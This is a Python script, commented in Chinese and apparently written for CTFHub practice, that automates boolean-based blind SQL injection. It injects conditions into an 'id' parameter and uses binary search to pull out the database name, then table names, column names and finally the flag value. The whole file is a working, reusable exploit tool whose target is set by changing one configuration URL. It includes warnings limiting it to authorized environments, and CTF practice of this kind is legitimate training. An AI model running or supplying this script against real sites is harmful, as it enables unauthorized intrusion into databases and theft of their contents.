#!/usr/bin/env python3
"""
布尔盲注自动化脚本（二分法）

用途：在 CTF 靶场或授权测试环境中，自动完成布尔盲注，逐字符提取数据库数据。

原理：
    构造条件  and ascii(substr(目标, 位置, 1)) > 数值
    根据页面响应判断条件真假，用二分法在 ASCII 范围(32~127)内快速定位字符。

用法：
    1. 修改下方【配置区】
    2. 运行：python blind_sqli.py

⚠️ 仅限授权环境使用！
"""
import sys
import time

import requests

# ==================== 配置区（改这里）====================
BASE = "http://challenge-xxx.ctfhub.com:10080/"   # 靶场根地址（不带 ?id=）
PAYLOAD = "1 and {condition}"                      # 整数型；字符型改为 "1' and {condition} #"
KEYWORD = "ctfhub"                                 # 真页面独有的关键词（手动对比真假页面得到）
DELAY = 0.03                                       # 请求间隔（秒），避免被限速
# ========================================================

session = requests.Session()


def is_true(condition):
    """发送 payload，条件为真时返回 True"""
    payload = PAYLOAD.format(condition=condition)
    r = session.get(BASE, params={"id": payload}, timeout=10)
    time.sleep(DELAY)
    return KEYWORD in r.text


def blind(expr, max_len=60):
    """
    猜出任意 SQL 表达式的结果字符串

    expr 示例：
        "database()"                                    -> 数据库名
        "(select table_name from information_schema.tables
          where table_schema=database() limit 0,1)"     -> 表名
    """
    # ① 先猜长度
    length = 0
    for i in range(1, max_len + 1):
        if is_true(f"length({expr})={i}"):
            length = i
            break
    if length == 0:
        return None

    print(f"长度={length}", end="  ", flush=True)

    # ② 二分法逐字符猜
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 127
        while low < high:
            mid = (low + high) // 2
            if is_true(f"ascii(substr({expr},{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        print(f"\r  → {result}", end="", flush=True)
    print()
    return result


def get_tables(limit=20):
    """获取当前数据库的所有表名"""
    tables = []
    for i in range(limit):
        t = blind(
            "(select table_name from information_schema.tables "
            f"where table_schema=database() limit {i},1)"
        )
        if not t:
            break
        tables.append(t)
    return tables


def get_columns(table, limit=20):
    """获取指定表的所有字段名"""
    cols = []
    for i in range(limit):
        c = blind(
            "(select column_name from information_schema.columns "
            f"where table_name='{table}' limit {i},1)"
        )
        if not c:
            break
        cols.append(c)
    return cols


def main():
    print("=" * 50)
    print("布尔盲注自动化脚本（二分法）")
    print("⚠️  仅限授权靶场使用")
    print("=" * 50)

    # ① 库名
    print("\n[*] 步骤 1/4：查询数据库名")
    db = blind("database()")
    if not db:
        print("[!] 查询失败：请检查 BASE / PAYLOAD / KEYWORD 配置")
        sys.exit(1)
    print(f"[+] 数据库名: {db}")

    # ② 表名
    print("\n[*] 步骤 2/4：查询表名")
    tables = get_tables()
    for i, t in enumerate(tables):
        print(f"[+] 表 {i}: {t}")

    # ③ 字段名
    print("\n[*] 步骤 3/4：查询字段名")
    if not tables:
        print("[!] 没有查到表，请检查配置")
        sys.exit(1)
    target_table = "flag" if "flag" in tables else tables[-1]
    cols = get_columns(target_table)
    for i, c in enumerate(cols):
        print(f"[+] 字段 {i}: {c}")

    # ④ 取数据
    print("\n[*] 步骤 4/4：读取数据")
    if not cols:
        print("[!] 没有查到字段，请检查配置")
        sys.exit(1)
    target_col = cols[0]
    value = blind(f"(select {target_col} from {target_table} limit 0,1)")
    print(f"\n[✓] 结果: {value}")


if __name__ == "__main__":
    main()
